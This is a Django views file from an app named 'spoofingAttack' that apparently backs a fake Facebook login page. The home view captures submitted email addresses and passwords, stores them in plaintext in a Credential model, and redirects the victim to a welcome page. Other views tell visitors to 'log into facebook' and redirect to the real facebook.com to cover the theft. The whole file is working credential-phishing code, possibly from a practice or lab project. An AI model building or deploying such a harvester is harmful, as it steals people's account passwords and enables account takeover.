from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import Credential
from spoofingAttack.forms import CredentialsForm

# Create your views here.
#def index(request):
#   return render(request, 'spoofingAttack/index_form.html')
    
def home(request):
    if request.method == 'POST':
       form = CredentialsForm(request.POST)
       if form.is_valid():
          form.save(commit = False)
          username = form.cleaned_data.get('email')
          password = form.cleaned_data.get('password')
          credentials = Credential.objects.create(email = username, password = password)
          #form.save()
          #credentials.save()
          return redirect('spoofingAttack:nowhere')
    else:
        form = CredentialsForm()
    return render(request, 'spoofingAttack/index_form.html', {'form':form})
    
def know(request):
    return HttpResponse("First log into facebook!")
    
def nowhere(request):
    if request.method == "POST":
       form = CredentialsForm(request.POST)
       
    else:
        form = CredentialsForm()
    ctx = {'form': form}
    return render(request, 'spoofingAttack/welcome.html', ctx)
    
def goToFacebbok(request):
    return redirect('https://www.facebook.com')
